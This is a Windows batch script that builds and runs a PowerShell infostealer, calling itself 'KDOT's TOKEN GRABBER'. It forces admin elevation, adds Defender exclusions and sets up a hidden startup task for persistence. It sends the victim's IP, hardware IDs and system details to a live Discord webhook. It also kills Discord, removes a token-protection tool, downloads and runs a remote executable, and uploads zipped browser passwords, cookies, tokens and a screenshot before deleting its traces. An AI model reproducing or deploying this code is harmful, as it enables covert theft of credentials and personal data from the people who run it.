@echo off

if not "%1"=="am_admin" (
    powershell -Command "Start-Process -Verb RunAs -FilePath '%0' -ArgumentList 'am_admin'"
    exit /b
)

echo function CHECK_IF_ADMIN { > powershell.ps1
echo     $test = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator); echo $test >> powershell.ps1
echo } >> powershell.ps1
echo function TASKS { >> powershell.ps1
echo     $test_KDOT = Test-Path -Path "$env:APPDATA\KDOT" >> powershell.ps1
echo     if ($test_KDOT -eq $false) { >> powershell.ps1
echo         try { >> powershell.ps1
echo             Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp" >> powershell.ps1
echo             Add-MpPreference -ExclusionPath "$env:APPDATA\KDOT" >> powershell.ps1
echo         } catch { >> powershell.ps1
echo             Write-Host "Failed to add exclusions" >> powershell.ps1
echo         } >> powershell.ps1
echo         New-Item -ItemType Directory -Path "$env:APPDATA\KDOT" >> powershell.ps1
echo         $origin = $PSCommandPath >> powershell.ps1
echo         Copy-Item -Path $origin -Destination "$env:APPDATA\KDOT\KDOT.ps1" >> powershell.ps1
echo     } >> powershell.ps1
echo     $test = Get-ScheduledTask ^| Select-Object -ExpandProperty TaskName >> powershell.ps1
echo     if ($test -contains "KDOT") { >> powershell.ps1
echo         Write-Host "KDOT already exists" >> powershell.ps1
echo     } else { >> powershell.ps1
echo         $schedule = New-ScheduledTaskTrigger -AtStartup >> powershell.ps1
echo         $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle hidden -File $env:APPDATA\KDOT\KDOT.ps1" >> powershell.ps1
echo         Register-ScheduledTask -TaskName "KDOT" -Trigger $schedule -Action $action -RunLevel Highest -Force >> powershell.ps1
echo     } >> powershell.ps1
echo     Grub >> powershell.ps1
echo } >> powershell.ps1
echo function Grub { >> powershell.ps1
echo     $webhook = "https://discord.com/api/webhooks/1190012860798083132/-bZksMS9DZaqUsje7BVdIL8nQ6Xpg2T7hXcRuCXLMLQ63U1C-2i9GmKXgsmkvcQRCJNp" >> powershell.ps1
echo     $ip = Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing >> powershell.ps1
echo     $ip = $ip.Content >> powershell.ps1
echo     $ip ^> $env:LOCALAPPDATA\Temp\ip.txt >> powershell.ps1
echo     $system_info = systeminfo.exe ^> $env:LOCALAPPDATA\Temp\system_info.txt >> powershell.ps1
echo     $uuid = Get-WmiObject -Class Win32_ComputerSystemProduct ^| Select-Object -ExpandProperty UUID  >> powershell.ps1
echo     $uuid ^> $env:LOCALAPPDATA\Temp\uuid.txt >> powershell.ps1
echo     $mac = Get-WmiObject -Class Win32_NetworkAdapterConfiguration ^| Select-Object -ExpandProperty MACAddress >> powershell.ps1
echo     $mac ^> $env:LOCALAPPDATA\Temp\mac.txt >> powershell.ps1
echo     $username = $env:USERNAME >> powershell.ps1
echo     $hostname = $env:COMPUTERNAME >> powershell.ps1
echo     $netstat = netstat -ano ^> $env:LOCALAPPDATA\Temp\netstat.txt >> powershell.ps1
echo     $embed_and_body = @{ >> powershell.ps1
echo         "username" = "KDOT" >> powershell.ps1
echo         "content" = "@everyone" >> powershell.ps1
echo         "title" = "KDOT" >> powershell.ps1
echo         "description" = "KDOT" >> powershell.ps1
echo         "color" = "16711680" >> powershell.ps1
echo         "avatar_url" = "https://cdn.discordapp.com/avatars/1009510570564784169/c4079a69ab919800e0777dc2c01ab0da.png" >> powershell.ps1
echo         "url" = "https://discord.gg/vk3rBhcj2y" >> powershell.ps1
echo         "embeds" = @( >> powershell.ps1
echo             @{ >> powershell.ps1
echo                 "title" = "SOMALI GRABBER" >> powershell.ps1
echo                 "url" = "https://discord.gg/vk3rBhcj2y" >> powershell.ps1
echo                 "description" = "New person grabbed using KDOT's TOKEN GRABBER" >> powershell.ps1
echo                 "color" = "16711680" >> powershell.ps1
echo                 "footer" = @{ >> powershell.ps1
echo                     "text" = "Made by KDOT and GODFATHER" >> powershell.ps1
echo                 } >> powershell.ps1
echo                 "thumbnail" = @{ >> powershell.ps1
echo                     "url" = "https://cdn.discordapp.com/avatars/1009510570564784169/c4079a69ab919800e0777dc2c01ab0da.png" >> powershell.ps1
echo                 } >> powershell.ps1
echo                 "fields" = @( >> powershell.ps1
echo                     @{ >> powershell.ps1
echo                         "name" = "IP" >> powershell.ps1
echo                         "value" = "``````$ip``````" >> powershell.ps1
echo                     }, >> powershell.ps1
echo                     @{ >> powershell.ps1
echo                         "name" = "Username" >> powershell.ps1
echo                         "value" = "``````$username``````" >> powershell.ps1
echo                     }, >> powershell.ps1
echo                     @{ >> powershell.ps1
echo                         "name" = "Hostname" >> powershell.ps1
echo                         "value" = "``````$hostname``````" >> powershell.ps1
echo                     }, >> powershell.ps1
echo                     @{ >> powershell.ps1
echo                         "name" = "UUID" >> powershell.ps1
echo                         "value" = "``````$uuid``````" >> powershell.ps1
echo                     }, >> powershell.ps1
echo                     @{ >> powershell.ps1
echo                         "name" = "MAC" >> powershell.ps1
echo                         "value" = "``````$mac``````" >> powershell.ps1
echo                     } >> powershell.ps1
echo                 ) >> powershell.ps1
echo             } >> powershell.ps1
echo         ) >> powershell.ps1
echo     } >> powershell.ps1
echo     $payload = $embed_and_body ^| ConvertTo-Json -Depth 10 >> powershell.ps1
echo     Invoke-WebRequest -Uri $webhook -Method POST -Body $payload -ContentType "application/json" ^| Out-Null >> powershell.ps1
echo     Set-Location $env:LOCALAPPDATA\Temp >> powershell.ps1
echo     taskkill.exe /f /im "Discord.exe" ^| Out-Null >> powershell.ps1
echo     taskkill.exe /f /im "DiscordCanary.exe" ^| Out-Null >> powershell.ps1
echo     taskkill.exe /f /im "DiscordPTB.exe" ^| Out-Null >> powershell.ps1
echo     taskkill.exe /f /im "DiscordTokenProtector.exe" ^| Out-Null >> powershell.ps1
echo     $token_prot = Test-Path "$env:APPDATA\DiscordTokenProtector\DiscordTokenProtector.exe" >> powershell.ps1
echo     if ($token_prot -eq $true) { >> powershell.ps1
echo         Remove-Item "$env:APPDATA\DiscordTokenProtector\DiscordTokenProtector.exe" -Force >> powershell.ps1
echo     } >> powershell.ps1
echo     $secure_dat = Test-Path "$env:APPDATA\DiscordTokenProtector\secure.dat" >> powershell.ps1
echo     if ($secure_dat -eq $true) { >> powershell.ps1
echo         Remove-Item "$env:APPDATA\DiscordTokenProtector\secure.dat" -Force >> powershell.ps1
echo     } >> powershell.ps1
echo     $TEMP_KOT = Test-Path "$env:LOCALAPPDATA\Temp\KDOT" >> powershell.ps1
echo     if ($TEMP_KOT -eq $false) { >> powershell.ps1
echo         New-Item "$env:LOCALAPPDATA\Temp\KDOT" -Type Directory >> powershell.ps1
echo     } >> powershell.ps1
echo     $gotta_make_sure = "penis"; Set-Content -Path "$env:LOCALAPPDATA\Temp\KDOT\bruh.txt" -Value "$gotta_make_sure" >> powershell.ps1
echo     Invoke-WebRequest -Uri "https://github.com/KDot227/Powershell-Token-Grabber/releases/download/Fixed_version/main.exe" -OutFile "main.exe" -UseBasicParsing >> powershell.ps1
echo     $proc = Start-Process $env:LOCALAPPDATA\Temp\main.exe -ArgumentList "$webhook" -NoNewWindow -PassThru >> powershell.ps1
echo     $proc.WaitForExit() >> powershell.ps1
echo     $lol = "$env:LOCALAPPDATA\Temp" >> powershell.ps1
echo     Move-Item -Path "$lol\ip.txt" -Destination "$lol\KDOT\ip.txt" -ErrorAction SilentlyContinue >> powershell.ps1
echo     Move-Item -Path "$lol\netstat.txt" -Destination "$lol\KDOT\netstat.txt" -ErrorAction SilentlyContinue >> powershell.ps1
echo     Move-Item -Path "$lol\system_info.txt" -Destination "$lol\KDOT\system_info.txt" -ErrorAction SilentlyContinue >> powershell.ps1
echo     Move-Item -Path "$lol\uuid.txt" -Destination "$lol\KDOT\uuid.txt" -ErrorAction SilentlyContinue >> powershell.ps1
echo     Move-Item -Path "$lol\mac.txt" -Destination "$lol\KDOT\mac.txt" -ErrorAction SilentlyContinue >> powershell.ps1
echo     Move-Item -Path "$lol\browser-cookies.txt" -Destination "$lol\KDOT\browser-cookies.txt" -ErrorAction SilentlyContinue >> powershell.ps1
echo     Move-Item -Path "$lol\browser-history.txt" -Destination "$lol\KDOT\browser-history.txt" -ErrorAction SilentlyContinue >> powershell.ps1
echo     Move-Item -Path "$lol\browser-passwords.txt" -Destination "$lol\KDOT\browser-passwords.txt" -ErrorAction SilentlyContinue >> powershell.ps1
echo     Move-Item -Path "$lol\desktop-screenshot.png" -Destination "$lol\KDOT\desktop-screenshot.png" -ErrorAction SilentlyContinue >> powershell.ps1
echo     Move-Item -Path "$lol\tokens.txt" -Destination "$lol\KDOT\tokens.txt" -ErrorAction SilentlyContinue >> powershell.ps1
echo     Compress-Archive -Path "$lol\KDOT" -DestinationPath "$lol\KDOT.zip" -Force >> powershell.ps1
echo     #Invoke-WebRequest -Uri "$webhook" -Method Post -InFile "$lol\KDOT.zip" -ContentType "multipart/form-data" >> powershell.ps1
echo     #curl.exe -X POST -H "Content-Type: multipart/form-data" -F "file=@$lol\KDOT.zip" $webhook >> powershell.ps1
echo     curl.exe -X POST -F 'payload_json={\"username\": \"KING KDOT\", \"content\": \"\", \"avatar_url\": \"https://cdn.discordapp.com/avatars/1009510570564784169/c4079a69ab919800e0777dc2c01ab0da.png\"}' -F "file=@$lol\KDOT.zip" $webhook >> powershell.ps1
echo     Remove-Item "$lol\KDOT.zip" >> powershell.ps1
echo     Remove-Item "$lol\KDOT" -Recurse >> powershell.ps1
echo     Remove-Item "$lol\main.exe" >> powershell.ps1
echo } >> powershell.ps1
echo if (CHECK_IF_ADMIN -eq $true) { >> powershell.ps1
echo     TASKS >> powershell.ps1
echo     #pause >> powershell.ps1
echo } else { >> powershell.ps1
echo     Write-Host ("Please run as admin!") -ForegroundColor Red >> powershell.ps1
echo     $origin = $MyInvocation.MyCommand.Path >> powershell.ps1
echo     Start-Process powershell -ArgumentList "-noprofile -file $origin" -verb RunAs >> powershell.ps1
echo } >> powershell.ps1
powershell Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted -Force
powershell.exe -executionpolicy bypass -windowstyle hidden -noninteractive -nologo -file powershell.ps1
del powershell.ps1 /f /q
timeout 3 > nul
exit
